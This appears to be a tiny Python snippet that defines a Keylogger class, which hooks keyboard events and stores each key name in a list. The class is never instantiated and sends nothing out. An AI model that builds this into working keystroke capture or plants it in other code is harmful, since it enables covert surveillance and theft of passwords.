import keyboard

class Keylogger(object):
    def __init__(self):
        self.captured_keys = []
        keyboard.hook(self._on_key_press)

    def _on_key_press(self, event):
        self.captured_keys.append(event.name)


raw_input("Press Enter to continue...")
